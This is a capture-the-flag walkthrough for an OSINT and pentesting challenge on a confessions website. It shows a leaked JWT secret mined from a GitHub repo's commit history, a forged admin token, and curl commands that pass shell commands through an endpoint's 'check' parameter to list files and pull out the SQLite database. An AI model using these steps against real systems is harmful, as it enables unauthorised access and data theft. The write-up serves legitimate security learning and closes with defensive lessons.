
# Your Confessions - Walkthrough

For this OSINT challenge, we were provided with just a single URL. Naturally, I began by searching it on the internet.

The link opened up a confessions website. It had a homepage listing confessions, along with **login** and **signup** pages. As a first step, I tried registering with some dummy credentials and then logged in successfully. I could now submit my own confessions — but nothing seemed too suspicious yet.

Since this was tagged as an *OSINT* challenge, I figured the key wouldn't be hidden inside the application’s main functionality. So I started exploring the site more closely. That's when I noticed something interesting in the footer:  
> *"Made with ❤ by NiceDev-31fab3e4"*

That looked like a solid lead.

---

### Step 1: Investigating the Username

I thought of checking GitHub to see if there was a user named `NiceDev-31fab3e4`. To be thorough, I used a tool called [Sherlock](https://github.com/sherlock-project/sherlock), which scans multiple social platforms for a given username. Sure enough, the username existed on GitHub — and even better — it had a public repository named `yc`.

Opening the repository, I realized this was **the actual code** for the same confessions website.

---

### Step 2: Exploring the Code

Going through the code, especially the `app.py` file, I discovered all the routes and endpoints. Most of them matched what I had already seen on the website. However, one endpoint caught my eye:

```
/serveruptimeforadmins
```

Unlike the others, this one was protected and required a **JWT token** for authorization.

In the repo, there was also a file named `.env.example` that hinted at the use of secrets:
- `APP_SECRET_KEY`
- `SQLALCHEMY_DATABASE_URI`
- `JWT_SECRET`

Any experienced developer knows it's dangerous to expose these kinds of secrets. That’s when I remembered a time I had accidentally committed my own secrets in a public repo — it happens! So, I wondered: **Did this developer make the same mistake?**

---

### Step 3: Recovering the Secret

To find out, I cloned the repo and checked its commit history using:

```bash
git log -p | grep JWT_SECRET
```

And there it was — the **JWT_SECRET** was accidentally committed and later removed. Jackpot!

---

### Step 4: Forging a JWT Token

With the secret in hand, I used [jwt.io](https://jwt.io) to manually forge a JWT token. I set the payload as:

```json
{
  "user_id": 1
}
```

I assumed that user ID `1` likely belonged to an admin. I signed the token using the leaked JWT_SECRET from the previous step.

Then, I tested access to the restricted endpoint using `curl`:

```bash
curl -X GET "http://<IP_ADDRESS>:5000/serveruptimeforadmins?check=uptime"   -H "Authorization: <your_token_here>"
```

And it worked! 

---

### Step 5: Digging into the Server

With access granted, I listed the server's files:

```bash
curl -X GET "http://<IP_ADDRESS>:5000/serveruptimeforadmins?check=ls"
```

This revealed a folder called `instance`. I looked into it and found a file named `confessions.db`. Given the project was using SQLite (as seen from the repo), I decided to retrieve the database file.

But downloading binary data through this endpoint isn’t direct — so I base64 encoded the file first:

```bash
curl -G "http://<IP_ADDRESS>:5000/serveruptimeforadmins"   --data-urlencode "check=base64 instance/confessions.db"   -H "Authorization: <your_token>"   --output encoded.txt
```

I cleaned the response to strip out HTML tags and then decoded it:

```bash
sed -n '/<pre>/,/<\/pre>/p' encoded.txt | sed '1d;$d' > clean_base64.txt
base64 -i clean_base64.txt -o confessions_fixed.db -d
```

---

### Step 6: Extracting the Flag

Finally, I opened the fixed database using SQLite:

```bash
sqlite3 confessions_fixed.db
```

Listing the tables:

```sql
.tables
```

Showed two tables:
- `user`
- `confession`

I queried the user table:

```sql
SELECT * FROM user;
```

And there it was — the flag inside the first user’s record.

---

### Final Thoughts

This challenge was a great blend of OSINT and beginner-level pentesting. It highlighted the importance of:
- Keeping secrets truly secret
- Scrubbing commit history before pushing code publicly
- Never trusting security through obscurity

A simple slip-up — committing a secret — led to full access to a protected admin route and the sensitive database behind it.

---
